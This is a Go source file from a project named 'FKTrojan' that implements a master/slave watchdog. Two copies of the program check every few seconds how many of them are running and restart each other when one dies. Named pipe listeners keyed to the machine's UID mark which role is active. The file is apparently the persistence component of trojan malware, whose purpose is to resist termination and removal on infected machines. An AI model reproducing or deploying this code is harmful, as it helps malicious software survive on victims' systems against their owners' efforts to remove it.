package client_singleton

import (
	"FKTrojan/common"
	"FKTrojan/dao"
	"FKTrojan/flog"
	"net"
	"os"
	"time"
)

func SlaveMainRun() error {
	for {
		time.Sleep(time.Second * 20)
		count, err := common.RunningCount(os.Args[0])
		if err != nil {
			continue
		}
		if count < 2 {
			err := startMaster()
			if err != nil {
				Flog.Flog.Println(err)
				continue
			}
		}
	}
	return nil
}
func SlaveIsRunning() (bool, error) {
	u, err := SlaveRegister()
	if err != nil {
		return true, nil
	}
	defer Unregister(u)
	return false, nil
}
func MasterMainRun() error {
	for {
		time.Sleep(time.Second * 2)
		count, err := common.RunningCount(os.Args[0])
		if err != nil {
			continue
		}
		if count < 2 {
			err := slaveStart()
			if err != nil {
				Flog.Flog.Println(err)
				continue
			}
		}
	}
	return nil
}

func SlaveRegister() (net.Listener, error) {
	uid, err := dao.GetUID()
	if err != nil {
		return nil, err
	}
	slaveID := uid + "-slave"
	return pipeListen(slaveID)
}
func MasterRegister() (net.Listener, error) {
	uid, err := dao.GetUID()
	if err != nil {
		return nil, err
	}
	slaveID := uid + "-master"
	return pipeListen(slaveID)
}
func Unregister(u net.Listener) error {
	return u.Close()
}
func MasterIsRunning() (bool, error) {
	u, err := MasterRegister()
	if err != nil {
		return true, nil
	}
	defer Unregister(u)
	return false, nil
}
